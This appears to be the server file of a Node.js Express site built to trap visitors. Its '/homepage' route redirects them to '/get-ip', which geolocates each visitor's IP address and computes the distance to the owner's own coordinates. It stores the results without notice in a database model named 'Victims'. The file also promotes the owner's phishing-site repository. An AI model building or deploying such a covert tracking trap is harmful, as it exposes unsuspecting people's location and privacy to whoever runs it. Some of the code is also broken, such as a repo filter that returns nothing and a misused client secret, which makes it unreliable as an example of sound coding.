// Server.js
// Copyright 2020-2021


// NPM Dependencies
require('dotenv').config();

const express = require("express");
const chalk = require('chalk');
const expressip = require('express-ip');
const ejs = require('ejs');
const mongoose = require('mongoose');
const geolib = require('geolib');
const cookieParser = require('cookie-parser');
const expressSession = require('express-session');
const crypto = require('crypto');
const passport = require('passport');
const GithubStrategy = require('passport-github').Strategy;
const { stringify } = require('flatted');
const _ = require('underscore');
// const GitHub = require('github-api');
const getGitHubData = require('./api');
const cors = require('cors');
const axios = require('axios');

// Import JS Files
const Victims = require('./model');

// Creation of the app
const app = express();

// Force to use HTTPS instead of HTTP
// app.set("trust proxy", true);
// app.use((req, res, next) => {
//   if (!req.secure) return res.redirect("https://" + req.get("host") + req.url);
//   next();
// });

// Connection with the database
mongoose.connect(process.env.DATABASE_URI, {
    useUnifiedTopology: true,
    useNewUrlParser: true
});

const db = mongoose.connection;

// Database response handling
db.on('connected', () => {
    console.log(chalk.yellow('database connected'));
});

db.on('disconnected', () => {
    console.log(chalk.redBright('database disconnected'));
});

db.on('error', () => {
    console.error(chalk.red('connection error'));
});

db.on('open', () => {
    console.log(chalk.green('database open'));
});

// Initialization of the server PORT
const PORT = process.env.PORT || 3000;

// My personal IP Address
const myIP = process.env.MY_IP;

// let scopes = ['notifications', 'user:email', 'read:org', 'repo'];
// passport.use(
//     new GithubStrategy(
//         {
//             clientID: process.env.CLIENT_ID,
//             clientSecret: process.env.CLIENT_SECRET,
//             callbackURL: 'http://localhost:3000/login/github/return',
//             scope: scopes.join(' ')
//         },
//         function (token, tokenSecret, profile, cb) {
//             return cb(null, { profile: profile, token: token })
//         }
//     )
// );

// passport.serializeUser(function (user, done) {
//     done(null, user);
// });

// passport.deserializeUser(function (obj, done) {
//     done(null, obj);
// });


// Middlewares
app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.set('view engine', 'ejs');
app.use(passport.initialize());
app.use(passport.session());
app.use(cookieParser())
// app.use(
//     expressSession({
//         secret: crypto.randomBytes(64).toString('hex'),
//         resave: true,
//         saveUninitialized: true
//     })
// );

// app.get('/logoff', function (req, res) {
//     res.clearCookie(COOKIE)
//     res.redirect('/')
// });

// app.get('/auth/github', passport.authenticate('github'))

// app.get(
//     '/login/github/return',
//     passport.authenticate('github', { successRedirect: '/setcookie', failureRedirect: '/' })
// );

// app.get('/setcookie', function (req, res) {
//     let data = {
//         user: req.session.passport.user.profile._json,
//         token: req.session.passport.user.token
//     };
//     res.cookie(COOKIE, JSON.stringify(data));
//     res.redirect('/');
// });

// async function getGitHubData(token) {
//     let gh = new GitHub({
//         token: token
//     });

//     let data = {};
//     let me = gh.getUser();
//     let repos = await me.listRepos();
//     data.repos = repos.data;
//     return data;
// };

// module.exports = getGitHubData;

app.use(cors());

app.get("/api/repos", (req, res) => {

    let bestRepos = repo => (repo.name === "SneakerBotJS") || (repo.name === "PRONOTE-CLONE-PHISHING-WEBSITE")


    axios({
        method: "get",
        url: `https://api.github.com/users/science-math-guy/repos/`,
        headers: {
            Authorization: `${process.env.CLIENT_SECRET}`,
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.mercy-preview+json" 
        }
    }).then(response => {
        let getBestRepos = data => {
            data.filter(bestRepos);
        }
        let data = getBestRepos(response.data)
        res.send(response.data);
    }).catch(err => {
        res.send(err);
    });
});

// GET Request
app.get('/', (req, res) => {
    // let data = {
    //     session: req.cookies[COOKIE] && JSON.parse(req.cookies[COOKIE])
    // };

	// if (data.session && data.session.token) {
	// 	let githubData
	// 	try {
	// 		githubData = await getGitHubData(data.session.token)
	// 	} catch (error) {
	// 		githubData = { error: error }
	// 	}
	// 	_.extend(data, githubData)
    // };

	// if (data.session) {
	// 	data.session.token = 'mildly obfuscated.'
    // };
    // data.json = stringify(data, null, 2);

    let data;

    axios({
        method: "get",
        url: `https://api.github.com/users/science-math-guy/repos/`,
        headers: {
            Authorization: `${process.env.CLIENT_SECRET}`,
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.mercy-preview+json" 
        }
    }).then(response => {
        data = response.data
    }).catch(err => {
        res.send(err);
    });



    // Render the main page
    res.render('pages/index');
});

app.get('/homepage', (req, res) => {

    // Redirection to trap users
    res.redirect('/get-ip');
});

app.get('/get-ip', (req, res) => {

    // Get the distance between me and the user
    let distance = geolib.getPreciseDistance(
        {
            latitude: parseFloat(process.env.MY_LATTITUDE),
            longitude: parseFloat(process.env.MY_LONGITUDE)
        },
        {
            latitude: req.ipInfo.ll[0],
            longitude: req.ipInfo.ll[1]
        }
    );

    console.log(chalk.bgGreen(`The distance between me and the user is ${distance}.`));

    // Creating object to save on the database
    let myData = new Victims(req.ipInfo);
    myData.distance = distance;

    // Save data on the database
    myData.save()
        .then(item => {
            console.log(chalk.bgGreen('username saved in the database'));
        })
        .catch(err => {
            console.log(chalk.bgRed('problem while saving username in the databse'));
        });
    
    // Render the page with user info
    res.render('pages/home', {
        info: myData
    });

});

// App listening
app.listen(PORT, () => {
  console.log(chalk.bgYellow(`Server listening on port ${PORT}...`));
});
